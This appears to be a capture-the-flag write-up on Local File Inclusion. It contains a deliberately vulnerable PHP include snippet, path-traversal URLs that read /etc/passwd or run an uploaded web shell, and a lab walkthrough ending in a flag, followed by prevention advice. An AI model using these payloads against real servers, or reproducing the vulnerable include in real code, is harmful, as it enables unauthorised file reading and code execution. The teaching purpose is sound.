# Local file inclusion

## Explanations

### What is the LFI (Local File Inclusion) vulnerablity ?

An attacker can use Local File Inclusion (LFI) to trick the web application into exposing or running files on the web server. An LFI attack may lead to information disclosure, remote code execution, or even Cross-site Scripting (XSS). Typically, LFI occurs when an application uses the path to a file as input. If the application treats this input as trusted, a local file may be used in the include statement.

The following is an example of PHP code that is vulnerable to LFI.

```php
/**
* Get the filename from a GET input
* Example - http://example.com/?file=filename.php
*/
$file = $_GET['file'];

/**
* Unsafely include the file
* Example - filename.php
*/
include('directory/' . $file);
```

In the above example, an attacker could make the following request. It tricks the application into executing a PHP script such as a web shell that the attacker managed to upload to the web server.

http://example.com/?file=../../uploads/evil.php

In this example, the file uploaded by the attacker will be included and executed by the user that runs the web application. That would allow an attacker to run any server-side malicious code that they want.

This is a worst-case scenario. An attacker does not always have the ability to upload a malicious file to the application. Even if they did, there is no guarantee that the application will save the file on the same server where the LFI vulnerability exists. Even then, the attacker would still need to know the disk path to the uploaded file.
Directory Traversal

Even without the ability to upload and execute code, a Local File Inclusion vulnerability can be dangerous. An attacker can still perform a Directory Traversal / Path Traversal attack using an LFI vulnerability as follows.

http://example.com/?file=../../../../etc/passwd

In the above example, an attacker can get the contents of the /etc/passwd file that contains a list of users on the server. Similarly, an attacker may leverage the Directory Traversal vulnerability to access log files (for example, Apache access.log or error.log), source code, and other sensitive information. This information may then be used to advance an attack.

### Let's get the Flag !

First, let's find a page that uses query parameters: for example: [sign in](http://192.168.1.38/index.php?page=signin)

And replace query parameters with `../../../../etc/passwd`:

```
http://192.168.1.38/index.php?page=../../../../etc/passwd
```

An alert is displayed with this message:

```
> Almost.
```

Let's try to increase the path:

```
http://192.168.1.38/index.php?page=../../../../../../../etc/passwd
```

Yeahhh

```
> Congratulaton!! The flag is : b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0
```

---

## How to avoid that security breach ?

Here are a few ways to prevent LFI attacks:

- ID assignation – save your file paths in a secure database and give an ID for every single one, this way users only get to see their ID without viewing or altering the path
- Whitelisting – use verified and secured whitelist files and ignore everything else
- Use databases – don’t include files on a web server that can be compromised, use a database instead
- Better server instructions – make the server send download headers automatically instead of executing files in a specified directory

---

#### Sources

[What is Local File Inclusion (LFI)?](https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/)
[Local file inclusion (prevention)](https://www.neuralegion.com/blog/local-file-inclusion-lfi/)
